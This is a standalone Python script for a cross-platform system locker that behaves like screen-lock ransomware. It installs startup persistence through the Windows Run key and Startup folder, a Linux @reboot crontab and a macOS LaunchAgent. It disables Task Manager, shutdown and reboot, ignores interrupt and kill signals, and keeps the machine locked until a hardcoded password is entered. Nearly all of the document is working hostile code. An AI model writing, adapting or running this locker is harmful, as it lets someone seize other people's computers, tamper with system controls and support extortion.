import os
import sys
import time
import subprocess
import threading
import signal
import platform
import ctypes
import shutil
import getpass

# ------------------------------------------------------------
# CONFIG
# ------------------------------------------------------------
PASSWORD = "secure123"      # unlock password
AUTO_STARTUP = True         # add to startup / persistence
# ------------------------------------------------------------

def get_os():
    return platform.system().lower()

# ---------------------- PERSISTENCE ----------------------
def install_persistence():
    os_name = get_os()
    script_path = os.path.abspath(sys.argv[0])
    try:
        if os_name == "windows":
            # Add to Windows startup folder (current user)
            startup_dir = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            dest = os.path.join(startup_dir, "system_lock.bat")
            with open(dest, "w") as f:
                f.write(f'@echo off\npython "{script_path}"\n')
            # Also add to registry Run key for robustness
            subprocess.run(["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "SystemLock", "/t", "REG_SZ", "/d", f'python "{script_path}"', "/f"], capture_output=True)
            print("[Persistence] Windows startup + registry installed")
        elif os_name == "linux":
            # Add to crontab for @reboot
            cron_line = f"@reboot python3 {script_path} &"
            with open("/tmp/cron_temp", "w") as f:
                subprocess.run(["crontab", "-l"], stdout=f, stderr=subprocess.DEVNULL, text=True)
            with open("/tmp/cron_temp", "a") as f:
                f.write(cron_line + "\n")
            subprocess.run(["crontab", "/tmp/cron_temp"], capture_output=True)
            os.remove("/tmp/cron_temp")
            print("[Persistence] Linux crontab @reboot installed")
        elif os_name == "darwin":
            # macOS launchd plist
            plist_path = os.path.expanduser("~/Library/LaunchAgents/com.systemlock.plist")
            plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.systemlock</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>'''
            with open(plist_path, "w") as f:
                f.write(plist_content)
            subprocess.run(["launchctl", "load", plist_path], capture_output=True)
            print("[Persistence] macOS launchd installed")
    except Exception as e:
        print(f"[Persistence] Error: {e}")

# ---------------------- LOCK FUNCTIONS ----------------------
def lock_windows():
    try:
        user32 = ctypes.WinDLL("user32")
        user32.LockWorkStation()
        subprocess.run(["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "/v", "DisableTaskMgr", "/t", "REG_DWORD", "/d", "1", "/f"], capture_output=True)
        subprocess.run(["reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "/v", "NoClose", "/t", "REG_DWORD", "/d", "1", "/f"], capture_output=True)
        subprocess.run(["reg", "add", "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Power", "/v", "HiberbootEnabled", "/t", "REG_DWORD", "/d", "0", "/f"], capture_output=True)
        print("[Windows] Locked, shutdown/taskmgr disabled")
    except Exception as e:
        print(f"[Windows] Lock error: {e}")

def lock_linux():
    try:
        subprocess.run(["gnome-screensaver-command", "-l"], capture_output=True, timeout=5)
        subprocess.run(["loginctl", "lock-session"], capture_output=True)
        subprocess.run(["systemctl", "mask", "systemd-poweroff.service"], capture_output=True)
        subprocess.run(["systemctl", "mask", "systemd-reboot.service"], capture_output=True)
        subprocess.run(["systemctl", "mask", "systemd-halt.service"], capture_output=True)
        print("[Linux] Locked, shutdown disabled")
    except Exception as e:
        print(f"[Linux] Lock error: {e}")

def lock_macos():
    try:
        subprocess.run(["pmset", "displaysleepnow"], capture_output=True)
        subprocess.run(["osascript", "-e", 'tell application "System Events" to key code 12 using {command down, control down}'], capture_output=True)
        subprocess.run(["sudo", "pmset", "-a", "autorestart", "0"], capture_output=True)
        print("[macOS] Locked")
    except Exception as e:
        print(f"[macOS] Lock error: {e}")

def lock_system():
    os_name = get_os()
    if os_name == "windows": lock_windows()
    elif os_name == "linux": lock_linux()
    elif os_name == "darwin": lock_macos()
    else: print(f"[!] Unsupported OS: {os_name}")

def unlock_system(password):
    return password == PASSWORD

# ---------------------- INTERRUPT BLOCK ----------------------
def ignore_signal(sig, frame):
    print("[!] Exit blocked (Ctrl+C / kill ignored)")
    lock_system()

# ---------------------- MAIN LOCK LOOP ----------------------
def startup_lock():
    print("[*] System locking in 3 seconds...")
    time.sleep(3)
    lock_system()
    while True:
        try:
            pwd = getpass.getpass("[LOCKED] Enter password to unlock: ")
            if unlock_system(pwd):
                print("[*] Unlocked successfully")
                break
            else:
                print("[!] Wrong password")
                lock_system()
        except KeyboardInterrupt:
            print("[!] Interrupt ignored")
            lock_system()
        except Exception as e:
            print(f"[!] Error: {e}")
            lock_system()

# ---------------------- MAIN ----------------------
def main():
    if os.geteuid() != 0 and get_os() != "windows":
        print("[!] On Linux/macOS run as root for full shutdown blocking")
    signal.signal(signal.SIGINT, ignore_signal)
    signal.signal(signal.SIGTERM, ignore_signal)
    if AUTO_STARTUP:
        install_persistence()
    startup_lock()

if __name__ == "__main__":
    main()